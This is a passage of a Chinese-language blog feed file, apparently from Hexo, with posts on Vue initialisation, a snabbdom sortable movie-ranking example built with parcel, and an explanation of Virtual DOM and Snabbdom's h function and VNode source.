class="keyword">this</span>._init(options)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面这些方法都是在 Vue 的原型上增加属性,即实例上也可以调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册 vm 的 _init() 方法，初始化 vm</span></span><br><span class="line">initMixin(Vue)</span><br><span class="line"><span class="comment">// 注册 vm 的 $data/$props/$set/$delete/$watch</span></span><br><span class="line">stateMixin(Vue)</span><br><span class="line"><span class="comment">// 初始化事件相关方法 $on/$once/$off/$emit</span></span><br><span class="line">eventsMixin(Vue)</span><br><span class="line"><span class="comment">// 初始化生命周期相关的混入方法 _update/$forceUpdate/$destroy</span></span><br><span class="line">lifecycleMixin(Vue)</span><br><span class="line"><span class="comment">// 混入 render $nextTick/_render</span></span><br><span class="line">renderMixin(Vue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Vue</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模拟实现snbbDom排行实例</title>
      <link href="2020/10/09/%E6%95%B4%E7%90%86-%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0-snbbDom-%E6%8E%92%E8%A1%8C%E5%AE%9E%E4%BE%8B/"/>
      <url>2020/10/09/%E6%95%B4%E7%90%86-%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0-snbbDom-%E6%8E%92%E8%A1%8C%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>官网示例：<a href="http://snabbdom.github.io/snabbdom/examples/reorder-animation/" target="_blank" rel="noopener">http://snabbdom.github.io/snabbdom/examples/reorder-animation/</a></li><li>代码地址：<a href="https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3" target="_blank" rel="noopener">https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3</a></li><li>构建工具 parcel</li></ul><a id="more"></a><h2 id="parcel"><a href="#parcel" class="headerlink" title="parcel"></a>parcel</h2><p>parcel 官网：<a href="https://zh.parceljs.org/getting_started.html" target="_blank" rel="noopener">https://zh.parceljs.org/getting_started.html</a></p><p>安装流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g parcel-bundler</span><br></pre></td></tr></table></figure><p>在你正在使用的项目目录下创建一个 package.json 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>Parcel 内置了一个当你改变文件时能够自动重新构建应用的开发服务器，而且为了实现快速开发，该开发服务器支持<a href="https://zh.parceljs.org/hmr.html" target="_blank" rel="noopener">热模块替换</a>。只需要在入口文件指出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parcel index.html</span><br></pre></td></tr></table></figure><h2 id="安装-snabbdom"><a href="#安装-snabbdom" class="headerlink" title="安装 snabbdom"></a>安装 snabbdom</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm i -D snabbdom</span><br></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>github地址：<a href="https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3" target="_blank" rel="noopener">https://github.com/jinjingxuan/part3_module1_task/tree/master/code_3</a></p><ul><li>关键代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Data &#125; <span class="keyword">from</span> <span class="string">'./Data.js'</span></span><br><span class="line"><span class="keyword">import</span> &#123; init &#125; <span class="keyword">from</span> <span class="string">"snabbdom/build/package/init"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; styleModule &#125; <span class="keyword">from</span> <span class="string">"snabbdom/build/package/modules/style"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; eventListenersModule &#125; <span class="keyword">from</span> <span class="string">"snabbdom/build/package/modules/eventlisteners"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; h &#125; <span class="keyword">from</span> <span class="string">"snabbdom/build/package/h"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> patch = init([styleModule, eventListenersModule]);</span><br><span class="line"><span class="keyword">var</span> container = <span class="built_in">document</span>.getElementById(<span class="string">"app"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// title</span></span><br><span class="line"><span class="keyword">var</span> title = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h(<span class="string">"h2"</span>, &#123;&#125;, <span class="string">"Top 10 movies"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// list-item</span></span><br><span class="line"><span class="keyword">var</span> item = <span class="function"><span class="keyword">function</span> (<span class="params">itemIdx, itemData</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h(<span class="string">"li"</span>, &#123; </span><br><span class="line">        style: &#123; </span><br><span class="line">            listStyle: <span class="string">"none"</span>, </span><br><span class="line">            display: <span class="string">"flex"</span>,</span><br><span class="line">            marginTop: <span class="string">"20px"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, [</span><br><span class="line">        h(<span class="string">"div"</span>, &#123;</span><br><span class="line">            style: &#123; </span><br><span class="line">                width: <span class="string">"5%"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, itemData.rank),</span><br><span class="line">        h(<span class="string">"div"</span>, &#123;</span><br><span class="line">            style: &#123; </span><br><span class="line">                width: <span class="string">"30%"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, itemData.title),</span><br><span class="line">        h(<span class="string">"div"</span>, &#123;</span><br><span class="line">            style: &#123; </span><br><span class="line">                width: <span class="string">"65%"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, itemData.desc)</span><br><span class="line">    ]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// list</span></span><br><span class="line"><span class="keyword">var</span> list = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> items = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; Data.length; i++) &#123;</span><br><span class="line">        items.push(item(i, Data[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h(<span class="string">"ul"</span>, &#123;</span><br><span class="line">        style: &#123;</span><br><span class="line">            padding: <span class="string">"0"</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, items);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// btns</span></span><br><span class="line"><span class="keyword">var</span> btns = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h(<span class="string">"div"</span>, &#123; <span class="attr">style</span>: &#123; <span class="attr">float</span>: <span class="string">"left"</span>, <span class="attr">display</span>: <span class="string">"flex"</span> &#125; &#125;, [</span><br><span class="line">        h(<span class="string">"span"</span>, &#123;&#125;, <span class="string">"Sort by:"</span>),</span><br><span class="line">        h(</span><br><span class="line">            <span class="string">"div"</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                style: &#123;</span><br><span class="line">                    marginLeft: <span class="string">"20px"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                on: &#123;</span><br><span class="line">                    click: sortByRank,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"Rank"</span></span><br><span class="line">        ),</span><br><span class="line">        h(</span><br><span class="line">            <span class="string">"div"</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                style: &#123;</span><br><span class="line">                    marginLeft: <span class="string">"20px"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                on: &#123;</span><br><span class="line">                    click: sortByTitle,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"Title"</span></span><br><span class="line">        ),</span><br><span class="line">        h(</span><br><span class="line">            <span class="string">"div"</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                style: &#123;</span><br><span class="line">                    marginLeft: <span class="string">"20px"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                on: &#123;</span><br><span class="line">                    click: sortByDes,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"Description"</span></span><br><span class="line">        ),</span><br><span class="line">    ]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// clearBoth</span></span><br><span class="line"><span class="keyword">var</span> clear = h(<span class="string">"div"</span>, &#123; <span class="attr">style</span>: &#123; <span class="attr">clear</span>: <span class="string">"both"</span> &#125; &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主节点</span></span><br><span class="line"><span class="keyword">var</span> pageNode = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h(</span><br><span class="line">        <span class="string">"div#main"</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            style: &#123;</span><br><span class="line">                width: <span class="string">"800px"</span>,</span><br><span class="line">                paddingTop: <span class="string">"30px"</span>,</span><br><span class="line">                margin: <span class="string">"0 auto"</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        [title(), btns(), clear, list()]</span><br><span class="line">    );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 首次渲染保存当前节点为老节点</span></span><br><span class="line"><span class="keyword">var</span> oldPageNode = patch(container, pageNode());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 刷新节点，并重新保存老节点</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateNode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    oldPageNode = patch(oldPageNode, pageNode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortByRank</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Data.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span>  a.rank - b.rank )</span><br><span class="line">    updateNode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortByTitle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Data.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span>  a.title.localeCompare(b.title) )</span><br><span class="line">    updateNode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortByDes</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Data.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span>  a.desc.localeCompare(b.desc) )</span><br><span class="line">    updateNode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 虚拟DOM与diff算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Virtual DOM 与 Diff 算法</title>
      <link href="2020/09/24/%E6%95%B4%E7%90%86-VirtualDOM%E4%B8%8EDiff%E7%AE%97%E6%B3%95/"/>
      <url>2020/09/24/%E6%95%B4%E7%90%86-VirtualDOM%E4%B8%8EDiff%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是虚拟DOM</li><li>使用 Snabbdom</li><li>源码解读<ul><li>h函数</li><li>VNode对象</li><li>init函数</li></ul></li><li>Diff 算法</li><li>v-for 带 key</li></ul><a id="more"></a><h2 id="什么是虚拟DOM"><a href="#什么是虚拟DOM" class="headerlink" title="什么是虚拟DOM"></a>什么是虚拟DOM</h2><ul><li>虚拟DOM是由普通的 JS 对象来描述 DOM 对象，因为不是真实的 DOM 对象，所以叫虚拟 DOM</li><li>创建虚拟 DOM 的开销比真实 DOM 小很多</li><li>虚拟 DOM 的好处是当状态改变时不需要立即更新 DOM，只需要一个虚拟树来描述 DOM，虚拟DOM内部将弄清楚如何有效（diff）的更新 DOM</li><li>如果每次更改应用程序状态都重新创建整个 DOM，则程序非常缓慢，而虚拟DOM可以跟踪上一次的状态</li><li><p>除了渲染 DOM 以外,还可以实现 SSR(Nuxt.js/Next.js),原生应用(Weex/React Native),小程序(mpvue/uni-app)</p></li><li><p>关于服务端渲染（SSR）可查看：</p><ul><li><a href="https://www.jianshu.com/p/b8cfa496b7ec" target="_blank" rel="noopener">https://www.jianshu.com/p/b8cfa496b7ec</a></li><li><a href="https://blog.csdn.net/github_34708151/article/details/98344114" target="_blank" rel="noopener">https://blog.csdn.net/github_34708151/article/details/98344114</a></li></ul></li></ul><h3 id="Virtual-DOM-库"><a href="#Virtual-DOM-库" class="headerlink" title="Virtual DOM 库"></a>Virtual DOM 库</h3><ul><li>Snabbdom<ul><li>Vue 2.x 内部使用的 Virtual DOM 就是改造的 Snabbom</li><li>大约 200 SLOC（single line of code）</li><li>通过模块可扩展</li><li>源码使用 TS 开发</li><li>最快的 Virtual DOM 之一</li></ul></li></ul><h2 id="使用-Snabbdom"><a href="#使用-Snabbdom" class="headerlink" title="使用 Snabbdom"></a>使用 Snabbdom</h2><ul><li>可以使用<code>parcel</code>构建工具，比较轻便</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add snabbdom</span><br></pre></td></tr></table></figure><ul><li>Snabbdom 官网 demo 中导入使用的是 common.js 模块化语法，我们使用 ES Modules 语法 import</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> snabbdom <span class="keyword">from</span> <span class="string">'snabbdom'</span> <span class="comment">// 导入所有函数</span></span><br><span class="line"><span class="keyword">import</span> &#123; init, h, thunk &#125; <span class="keyword">from</span> <span class="string">'snabbdom'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不使用 import snabbdom from 'snabbdom' 是因为</span></span><br><span class="line"><span class="comment">// snabbdom.ts 末尾导出使用的语法是 export 导出，而没有使用 export default</span></span><br></pre></td></tr></table></figure><ul><li>init 是一个高阶函数，返回 patch()</li><li>h()返回虚拟结点 VNode，这个函数在Vue.js中见过</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    router,</span><br><span class="line">    store,</span><br><span class="line">    render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><ul><li>thunk()是一种优化策略，可以在处理不可变数据时使用</li></ul><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// div中放置子元素 h1,p</span></span><br><span class="line"><span class="keyword">import</span> &#123; h, init &#125; <span class="keyword">from</span> <span class="string">'snabbdom'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// patch函数，作用对比两个vnode的差异更新到真实DOM</span></span><br><span class="line"><span class="keyword">let</span> patch = init([])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个参数：标签+选择器</span></span><br><span class="line"><span class="comment">// 第二个参数：如果是字符串的话就是标签中的内容</span></span><br><span class="line"><span class="keyword">let</span> vnode = h(<span class="string">'div#container'</span>, [</span><br><span class="line">  h(<span class="string">'h1'</span>, <span class="string">'Hello Snabbdom'</span>),</span><br><span class="line">  h(<span class="string">'p'</span>, <span class="string">'这是一个p标签'</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="built_in">document</span>.querySelector(<span class="string">'#app'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oldVnode = patch(app, vnode)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两秒之后继续更新</span></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  vnode = h(<span class="string">'div#container'</span>, [</span><br><span class="line">    h(<span class="string">'h1'</span>, <span class="string">'Hello World'</span>),</span><br><span class="line">    h(<span class="string">'p'</span>, <span class="string">'Hello P'</span>)</span><br><span class="line">  ])</span><br><span class="line">  patch(oldVnode, vnode)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 清空页面元素 -- 错误</span></span><br><span class="line">  <span class="comment">// patch(oldVnode, null)</span></span><br><span class="line">  <span class="comment">// patch(oldVnode, h('!'))</span></span><br><span class="line">&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure><h3 id="snabbdom的模块"><a href="#snabbdom的模块" class="headerlink" title="snabbdom的模块"></a>snabbdom的模块</h3><p><strong>类似于插件机制</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; init, h &#125; <span class="keyword">from</span> <span class="string">'snabbdom'</span></span><br><span class="line"><span class="comment">// 1. 导入模块</span></span><br><span class="line"><span class="keyword">import</span> style <span class="keyword">from</span> <span class="string">'snabbdom/modules/style'</span></span><br><span class="line"><span class="keyword">import</span> eventlisteners <span class="keyword">from</span> <span class="string">'snabbdom/modules/eventlisteners'</span></span><br><span class="line"><span class="comment">// 2. 注册模块</span></span><br><span class="line"><span class="keyword">let</span> patch = init([</span><br><span class="line">  style,</span><br><span class="line">  eventlisteners</span><br><span class="line">])</span><br><span class="line"><span class="comment">// 3. 使用 h() 函数的第二个参数传入模块需要的数据（对象）</span></span><br><span class="line"><span class="keyword">let</span> vnode = h(<span class="string">'div'</span>, &#123;</span><br><span class="line">  style: &#123;</span><br><span class="line">    backgroundColor: <span class="string">'red'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  on: &#123;</span><br><span class="line">    click: eventHandler</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, [</span><br><span class="line">  h(<span class="string">'h1'</span>, <span class="string">'Hello Snabbdom'</span>),</span><br><span class="line">  h(<span class="string">'p'</span>, <span class="string">'这是p标签'</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eventHandler</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'点击我了'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="built_in">document</span>.querySelector(<span class="string">'#app'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oldVnode = patch(app, vnode)</span><br></pre></td></tr></table></figure><h2 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h2><p>源码地址：<a href="https://github.com/snabbdom/snabbdom" target="_blank" rel="noopener">https://github.com/snabbdom/snabbdom</a></p><h3 id="h函数："><a href="#h函数：" class="headerlink" title="h函数："></a>h函数：</h3><ul><li><code>h</code> 函数主要根据传进来的参数，返回一个 vnode 对象</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// h函数的重载，TS支持</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">h</span> (<span class="params">sel: <span class="built_in">string</span></span>): <span class="title">VNode</span></span></span><br><span class="line"><span class="function"><span class="title">export</span> <span class="function"><span class="keyword">function</span> <span class="title">h</span> (<span class="params">sel: <span class="built_in">string</span>, data: VNodeData | <span class="literal">null</span></span>): <span class="title">VNode</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="title">export</span> <span class="function"><span class="keyword">function</span> <span class="title">h</span> (<span class="params">sel: <span class="built_in">string</span>, children: VNodeChildren</span>): <span class="title">VNode</span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="title">export</span> <span class="function"><span class="keyword">function</span> <span class="title">h</span> (<span class="params">sel: <span class="built_in">string</span>, data: VNodeData | <span class="literal">null</span>, children: VNodeChildren</span>): <span class="title">VNode</span></span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function"><span class="title">export</span> <span class="function"><span class="keyword">function</span> <span class="title">h</span> (<span class="params">sel: <span class="built_in">any</span>, b?: <span class="built_in">any</span>, c?: <span class="built_in">any</span></span>): <span class="title">VNode</span> </span>&#123;</span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="function">  <span class="title">var</span> <span class="title">data</span>: <span class="title">VNodeData</span> = </span>&#123;&#125;, <span class="title">children</span>: <span class="title">any</span>, <span class="title">text</span>: <span class="title">any</span>, <span class="title">i</span>: <span class="title">number</span></span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">  // 处理参数，实现重载的机制</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function">  <span class="title">if</span> (<span class="params">c !== <span class="literal">undefined</span></span>) </span>&#123;</span></span></span><br><span class="line"><span class="function"><span class="function">    // 处理三个参数的情况</span></span></span><br><span class="line"><span class="function"><span class="function">    // ...</span></span></span><br><span class="line"><span class="function"><span class="function">  // 处理两个参数的情况</span></span></span><br><span class="line"><span class="function"><span class="function">  &#125; <span class="title">else</span> <span class="title">if</span> (<span class="params">b !== <span class="literal">undefined</span> &amp;&amp; b !== <span class="literal">null</span></span>) </span>&#123;</span></span><br><span class="line"><span class="function">// ...</span></span><br><span class="line"><span class="function">  &#125;</span></span><br><span class="line"><span class="function">  <span class="title">if</span> (<span class="params">children !== <span class="literal">undefined</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 处理 children 中的原始值（string/number）</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; children.length; ++i) &#123;</span><br><span class="line">      <span class="comment">// 如果 child 是 string/number，创建文本节点</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果是 svg ，创建命名空间</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    sel[<span class="number">0</span>] === <span class="string">'s'</span> &amp;&amp; sel[<span class="number">1</span>] === <span class="string">'v'</span> &amp;&amp; sel[<span class="number">2</span>] === <span class="string">'g'</span> &amp;&amp;</span><br><span class="line">    (sel.length === <span class="number">3</span> || sel[<span class="number">3</span>] === <span class="string">'.'</span> || sel[<span class="number">3</span>] === <span class="string">'#'</span>)</span><br><span class="line">  ) &#123;</span><br><span class="line">    addNS(data, children, sel)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回vnode</span></span><br><span class="line">  <span class="keyword">return</span> vnode(sel, data, children, text, <span class="literal">undefined</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="VNode对象"><a href="#VNode对象" class="headerlink" title="VNode对象"></a>VNode对象</h3><ul><li><p>一个 VNode 就是一个虚拟节点用来描述一个 DOM 元素，如果这个 VNode 有 children 就是Virtual DOM</p></li><li><p>源码位置：src/vnode.ts</p></li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> Key = <span class="built_in">string</span> | <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 接口</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> VNode &#123;</span><br><span class="line">  <span class="comment">// 选择器  </span></span><br><span class="line">  sel: <span class="built_in">string</span> | <span class="literal">undefined</span></span><br><span class="line">  <span class="comment">// 节点数据：属性/样式/事件等</span></span><br><span class="line">  data: VNodeData | <span class="literal">undefined</span></span><br><span class="line">  <span class="comment">// 子节点</span></span><br><span class="line">  children: <span class="built_in">Array</span>&lt;VNode | <span 